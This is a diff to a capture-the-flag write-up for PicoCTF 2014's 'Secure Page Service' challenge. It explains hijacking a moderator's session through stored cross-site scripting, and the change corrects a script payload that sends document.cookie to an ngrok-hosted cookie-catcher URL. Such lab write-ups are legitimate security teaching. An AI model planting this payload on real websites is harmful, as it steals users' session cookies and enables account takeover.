@@ -1,6 +1,6 @@
 ## Secure Page Service
 
-This challenge comes from PicoCTF. We have access to a very simple website with login features that allows users to post comments.
+This challenge comes from PicoCTF 2014. We have access to a very simple website with login features that allows users to post comments.
 
 Our goal is to view the page with the id ```43440b22864b30a0098f034eaf940730ca211a55``` which is password locked. Only the site moderator could see this post, so we are to somehow disguise ourselves as the site moderator.
 The way we can "pretend" as the site moderator is to hijack their session. Http is a stateless protocol, and the way server identifies individual users is by their cookies. 
@@ -40,8 +40,8 @@ Forwarding                    https://11465a2b.ngrok.io -> localhost:80
 Connections                   ttl     opn     rt1     rt5     p50     p90
                               0       0       0.00    0.00    0.00    0.00
 ```
-We are using GET method, so the code that we want to embed is something like 
-```<script> location.href=("https://11465a2b.ngrok.io/cookieCatcher.php?cookie="document.cookie)</script>```
+We are using GET method, so the code that we want to embed is 
+```<script> location.href=("https://11465a2b.ngrok.io/cookieCatcher.php?cookie=" + document.cookie)</script>```
 
 Note that ```document.cookie``` is outside the quotation. This redirects the user to ```cookieCatcher.php``` where we collect their cookie.
 Fill out the comment with the script and click on "create". To prevent the script from executing for ourselves, add a password to this post. Now click on "report to the moderator" button, and check ```cookies.html```. You should see
